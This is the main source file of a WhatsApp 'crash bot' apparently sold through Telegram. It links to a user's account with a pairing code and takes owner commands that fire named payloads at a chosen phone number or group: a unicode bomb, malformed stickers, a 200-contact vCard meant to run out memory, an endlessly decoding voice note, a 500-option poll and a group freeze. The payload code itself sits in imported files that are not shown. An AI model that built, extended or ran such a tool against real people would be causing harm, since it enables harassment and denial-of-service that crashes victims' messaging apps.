/**
 * ╔══════════════════════════════════════════════════╗
 * ║              X E X O  B O T  v3                 ║
 * ║         by yamisaint | @saintbypass             ║
 * ║   t.me/sourcecodemarket666 | github/blackclover20007 ║
 * ╚══════════════════════════════════════════════════╝
 *
 * 1. npm install
 * 2. node index.js  → bot asks for your number
 * 3. enter the pairing code on your phone
 */

"use strict";

const readline = require("readline");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  jidNormalizedUser,
} = require("@whiskeysockets/baileys");
const pino   = require("pino");
const qrcode = require("qrcode-terminal");
const fs     = require("fs");
const CONFIG = require("./config");

// ── PAYLOADS ──────────────────────────────────────────────────────────────────
const { crashfinity } = require("./payloads/crashfinity");
const { crashjam }    = require("./payloads/crashjam");
const { stickerCrash }= require("./payloads/stickerCrash");
const { groupFreeze } = require("./payloads/groupFreeze");
const { vcardBomb }   = require("./payloads/vcardBomb");
const { audioLoop }   = require("./payloads/audioLoop");
const { pollNuke }    = require("./payloads/pollNuke");

// ── LOGGER ────────────────────────────────────────────────────────────────────
const logger = pino({ level: CONFIG.LOG_LEVEL || "silent" });

// ── STATE ─────────────────────────────────────────────────────────────────────
let pairingRequested = false;
let defaultTarget    = CONFIG.DEFAULT_TARGET ? toJid(CONFIG.DEFAULT_TARGET) : null;

// dedup: track processed message IDs so we never fire a command twice
const processed = new Set();
function markSeen(id) {
  processed.add(id);
  // cap at 500 to avoid memory leak on long sessions
  if (processed.size > 500) {
    const first = processed.values().next().value;
    processed.delete(first);
  }
}

// ── HELPERS ───────────────────────────────────────────────────────────────────
function toJid(input) {
  if (!input) return null;
  const s = String(input).trim();
  if (s.includes("@")) return s;
  const clean = s.replace(/\D/g, "");
  return clean.length >= 7 ? `${clean}@s.whatsapp.net` : null;
}

function isOwner(jid) {
  if (!CONFIG.OWNERS?.length) return true;
  const n = jidNormalizedUser(jid);
  return CONFIG.OWNERS.some((o) => jidNormalizedUser(toJid(o) || o) === n);
}

// self-chat: messages you send TO YOURSELF show fromMe=true but the bot still
// needs to read them. Detect by comparing remoteJid to the bot's own jid.
function isSelfChat(msg, myJid) {
  return msg.key.remoteJid === myJid;
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── RETRY SEND ────────────────────────────────────────────────────────────────
// Wraps sendMessage with 2 retries + 600 ms backoff — kills the "resend bug"
// where a single dropped ACK causes the command to silently fail.
async function safeSend(sock, jid, content, opts = {}) {
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      return await sock.sendMessage(jid, content, opts);
    } catch (e) {
      if (attempt === 2) throw e;
      await sleep(600);
    }
  }
}

// ── INTERACTIVE NUMBER PROMPT ─────────────────────────────────────────────────
function askNumber() {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    const ask = () => {
      rl.question(
        "\n╔══════════════════════════════════════════╗\n" +
        "║       X E X O  —  Pairing Setup          ║\n" +
        "║           by yamisaint                   ║\n" +
        "╠══════════════════════════════════════════╣\n" +
        "║  Enter your WhatsApp number              ║\n" +
        "║  Format : country code + digits          ║\n" +
        "║  Example: 263714373922                   ║\n" +
        "╚══════════════════════════════════════════╝\n" +
        "  Number: ",
        (ans) => {
          const clean = ans.replace(/\D/g, "");
          if (clean.length < 8) {
            console.log("  [!] too short — try again (e.g. 263784970429)");
            ask();
          } else {
            rl.close();
            resolve(clean);
          }
        }
      );
    };
    ask();
  });
}

// ── MENU ──────────────────────────────────────────────────────────────────────
function buildMenu() {
  const p = CONFIG.PREFIX;
  return [
    "╔══════════════════════════════════════════╗",
    "║        X  E  X  O    B  O  T   v3       ║",
    "║            by yamisaint                 ║",
    "╠══════════════════════════════════════════╣",
    "║  🎯  TARGETING                           ║",
    `║  ${p}target <number>                    ║`,
    "║  set or view default target              ║",
    "╠══════════════════════════════════════════╣",
    "║  💥  CRASH PAYLOADS                      ║",
    `║  ${p}crashfinity  [number]              ║`,
    "║  → payment-msg unicode bomb              ║",
    `║  ${p}crashjam     [number]              ║`,
    "║  → text burst (5 rounds)                ║",
    `║  ${p}stickercrash [number]              ║`,
    "║  → malformed sticker burst × 6          ║",
    "╠══════════════════════════════════════════╣",
    "║  🧨  NEW PAYLOADS v3                     ║",
    `║  ${p}vcardbomb    [number]              ║`,
    "║  → 200-contact vCard OOM                ║",
    `║  ${p}audioloop    [number]              ║`,
    "║  → infinite-decode voice note           ║",
    `║  ${p}pollnuke     [number]              ║`,
    "║  → 500-option poll layout crash         ║",
    "╠══════════════════════════════════════════╣",
    "║  ❄️   GROUP PAYLOADS                    ║",
    `║  ${p}gcfreeze <jid> [rounds]            ║`,
    "║  rounds default: 8                      ║",
    "╠══════════════════════════════════════════╣",
    "║  🔧  UTILS                               ║",
    `║  ${p}ping  ${p}alive  ${p}status  ${p}menu║`,
    "╠══════════════════════════════════════════╣",
    "║  📡  OWNER LINKS                         ║",
    "║  TG   : @saintbypass                    ║",
    "║  CH   : whatsapp.com/channel/...        ║",
    "║  SHOP : t.me/sourcecodemarket666        ║",
    "║  GH   : github/blackclover20007         ║",
    "╚══════════════════════════════════════════╝",
    `  target : ${defaultTarget || "not set"}`,
    `  prefix : ${CONFIG.PREFIX}`,
  ].join("\n");
}

// ── CONNECT NOTIFICATION ──────────────────────────────────────────────────────
async function sendConnectNotice(sock) {
  const ownerJid = toJid(CONFIG.OWNER_NUMBER);
  if (!ownerJid) return;

  const caption =
    `╔══════════════════════════════════════╗\n` +
    `║     X E X O  B O T  v3  Online  ✓   ║\n` +
    `╠══════════════════════════════════════╣\n` +
    `║  Owner   : ${CONFIG.OWNER_NAME.padEnd(28)}║\n` +
    `║  Prefix  : ${CONFIG.PREFIX.padEnd(28)}║\n` +
    `║  TG      : ${CONFIG.OWNER_TELEGRAM.padEnd(28)}║\n` +
    `║  Shop    : t.me/sourcecodemarket666  ║\n` +
    `║  GitHub  : github/blackclover20007  ║\n` +
    `╚══════════════════════════════════════╝\n` +
    `📡 Channel: ${CONFIG.OWNER_CHANNEL}`;

  try {
    await safeSend(sock, ownerJid, {
      image: { url: CONFIG.CONNECT_PIC },
      caption,
    });
  } catch (_) {
    try { await safeSend(sock, ownerJid, { text: caption }); } catch (_) {}
  }
}

// ── AUTH ──────────────────────────────────────────────────────────────────────
async function startBot() {
  if (!fs.existsSync(CONFIG.SESSION_DIR)) {
    fs.mkdirSync(CONFIG.SESSION_DIR, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(CONFIG.SESSION_DIR);
  const { version }          = await fetchLatestBaileysVersion();

  let pairingNumber = String(CONFIG.PAIRING_NUMBER || "").replace(/\D/g, "");
  if (!pairingNumber && !state.creds.registered) {
    pairingNumber = await askNumber();
  }

  const sock = makeWASocket({
    version,
    auth: {
      creds: state.creds,
      keys:  makeCacheableSignalKeyStore(state.keys, logger),
    },
    logger,
    printQRInTerminal:              false,
    browser:                        CONFIG.BROWSER || ["Ubuntu", "Chrome", "20.0.04"],
    markOnlineOnConnect:            true,
    generateHighQualityLinkPreview: false,
    syncFullHistory:                false,
    connectTimeoutMs:               60_000,
    defaultQueryTimeoutMs:          60_000,
    keepAliveIntervalMs:            10_000,
    // retryRequestDelayMs helps with session churn / closing session spam
    retryRequestDelayMs:            250,
  });

  sock.ev.on("creds.update", saveCreds);

  // store our own JID once connected so self-chat detection works
  let myJid = null;

  // ── CONNECTION ──────────────────────────────────────────────────────────────
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && CONFIG.USE_PAIRING_CODE && !sock.authState.creds.registered && !pairingRequested) {
      pairingRequested = true;
      if (!pairingNumber || pairingNumber.length < 8) {
        console.log("[XEXO] no valid number — QR fallback");
        qrcode.generate(qr, { small: true });
      } else {
        try {
          await sleep(1200);
          const code   = await sock.requestPairingCode(pairingNumber);
          const pretty = code?.match(/.{1,4}/g)?.join("-") || code;
          console.log("\n╔══════════════════════════════════════════╗");
          console.log("║       X E X O  —  PAIRING CODE           ║");
          console.log(`║           ${pretty.padEnd(30)}║`);
          console.log("╚══════════════════════════════════════════╝");
          console.log("WhatsApp → Settings → Linked Devices → Link a Device → Link with phone number\n");
        } catch (e) {
          console.error("[XEXO] pairing failed:", e.message);
          qrcode.generate(qr, { small: true });
        }
      }
    } else if (qr && !CONFIG.USE_PAIRING_CODE) {
      console.log("\n[XEXO] Scan QR:\n");
      qrcode.generate(qr, { small: true });
    }

    if (connection === "open") {
      myJid = jidNormalizedUser(sock.user?.id || "");
      console.log("\n╔══════════════════════════════════════════╗");
      console.log("║     X E X O  B O T  v3  Connected  ✓    ║");
      console.log(`║  Owner  : ${CONFIG.OWNER_NAME.padEnd(31)}║`);
      console.log(`║  Prefix : ${CONFIG.PREFIX.padEnd(31)}║`);
      console.log(`║  JID    : ${(myJid || "unknown").padEnd(31)}║`);
      console.log("╚══════════════════════════════════════════╝\n");
      await sendConnectNotice(sock);
    }

    if (connection === "close") {
      const code      = lastDisconnect?.error?.output?.statusCode;
      const reconnect = code !== DisconnectReason.loggedOut;
      console.log(`[XEXO] closed (${code}) reconnect=${reconnect}`);
      pairingRequested = false;
      myJid = null;
      if (reconnect) startBot();
      else {
        console.log("[XEXO] logged out — delete session dir and restart");
        process.exit(1);
      }
    }
  });

  // ── COMMAND ROUTER ──────────────────────────────────────────────────────────
  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return;

    for (const msg of messages) {
      try {
        // ── DEDUP ────────────────────────────────────────────────────────────
        const msgId = msg.key.id;
        if (!msgId || processed.has(msgId)) continue;
        markSeen(msgId);

        // ── SELF-CHAT FIX ─────────────────────────────────────────────────────
        // In a normal chat: skip messages the bot sent (fromMe=true)
        // In self-chat (messaging yourself): fromMe=true for YOUR commands too,
        //   so we only skip if it's NOT the self-chat JID.
        const jid        = msg.key.remoteJid;
        const selfChatting = myJid && isSelfChat(msg, myJid + "@s.whatsapp.net") ||
                             myJid && jid === myJid.replace(/@.+/, "") + "@s.whatsapp.net";

        if (msg.key.fromMe && !selfChatting) continue;
        if (jid === "status@broadcast")      continue;

        const text =
          msg.message?.conversation ||
          msg.message?.extendedTextMessage?.text ||
          msg.message?.imageMessage?.caption    ||
          msg.message?.videoMessage?.caption    || "";

        if (!text.startsWith(CONFIG.PREFIX)) continue;
        if (!isOwner(jid))                   continue;

        const body    = text.slice(CONFIG.PREFIX.length).trim();
        const [cmd, ...args] = body.split(/\s+/);
        const command = (cmd || "").toLowerCase();
        const arg1    = args[0] || "";
        const arg2    = args[1] || "";

        // safeSend wrapper — 3 attempts, 600 ms backoff
        const reply = (t) => safeSend(sock, jid, { text: t }, { quoted: msg });

        // ── UTILS ──────────────────────────────────────────────────────────────
        if (command === "menu" || command === "help") {
          await reply(buildMenu());
          continue;
        }

        if (command === "ping") {
          const t0 = Date.now();
          await reply(`⚡ pong — ${Date.now() - t0}ms\nXEXO v3 by ${CONFIG.OWNER_NAME}`);
          continue;
        }

        // .alive — same as ping but different label (you typed it in the screenshot)
        if (command === "alive") {
          const t0 = Date.now();
          await reply(
            `╔══════════════════════════╗\n` +
            `║  XEXO v3  —  Alive  ✓   ║\n` +
            `╠══════════════════════════╣\n` +
            `║  latency : ${(Date.now() - t0 + "ms").padEnd(14)}║\n` +
            `║  uptime  : ${(Math.floor(process.uptime()) + "s").padEnd(14)}║\n` +
            `║  owner   : ${CONFIG.OWNER_NAME.padEnd(14)}║\n` +
            `╚══════════════════════════╝`
          );
          continue;
        }

        if (command === "status") {
          await reply(
            `╔═ XEXO v3 STATUS ══════════════════╗\n` +
            `║ owner  : ${CONFIG.OWNER_NAME.padEnd(25)}║\n` +
            `║ target : ${(defaultTarget || "not set").padEnd(25)}║\n` +
            `║ prefix : ${CONFIG.PREFIX.padEnd(25)}║\n` +
            `║ uptime : ${(Math.floor(process.uptime()) + "s").padEnd(25)}║\n` +
            `╚═══════════════════════════════════╝`
          );
          continue;
        }

        // ── TARGETING ──────────────────────────────────────────────────────────
        if (command === "target") {
          if (!arg1) {
            await reply(`current target: ${defaultTarget || "not set"}\nusage: ${CONFIG.PREFIX}target 263714373922`);
            continue;
          }
          const t = toJid(arg1);
          if (!t) { await reply(`invalid number: ${arg1}`); continue; }
          defaultTarget = t;
          await reply(`✓ target set → ${t}`);
          continue;
        }

        const resolveTarget = () => toJid(arg1) || defaultTarget;

        // ── CRASH PAYLOADS ─────────────────────────────────────────────────────
        if (command === "crashfinity") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`⚡ crashfinity → ${t}`);
          try   { await crashfinity(sock, t); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        if (command === "crashjam") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`⚡ crashjam → ${t}`);
          try   { await crashjam(sock, t, 5); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        if (command === "stickercrash") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`⚡ stickercrash → ${t}`);
          try   { await stickerCrash(sock, t); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        // ── NEW PAYLOADS v3 ────────────────────────────────────────────────────
        if (command === "vcardbomb") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`🧨 vcardbomb → ${t} (200 contacts)`);
          try   { await vcardBomb(sock, t, 200); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        if (command === "audioloop") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`🧨 audioloop → ${t}`);
          try   { await audioLoop(sock, t); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        if (command === "pollnuke") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`🧨 pollnuke → ${t} (500 options)`);
          try   { await pollNuke(sock, t); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        // ── GROUP PAYLOADS ─────────────────────────────────────────────────────
        if (command === "gcfreeze") {
          const g      = arg1.includes("@") ? arg1 : null;
          const rounds = parseInt(arg2, 10) || 8;
          if (!g) {
            await reply(`usage: ${CONFIG.PREFIX}gcfreeze 120363...@g.us [rounds]`);
            continue;
          }
          await reply(`❄️ gcfreeze → ${g} (${rounds} rounds)`);
          try   { await groupFreeze(sock, g, rounds); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

      } catch (err) {
        console.error("[handler]", err.message);
      }
    }
  });
}

// ── BOOT ──────────────────────────────────────────────────────────────────────
startBot().catch((e) => {
  console.error("[FATAL]", e);
  process.exit(1);
});
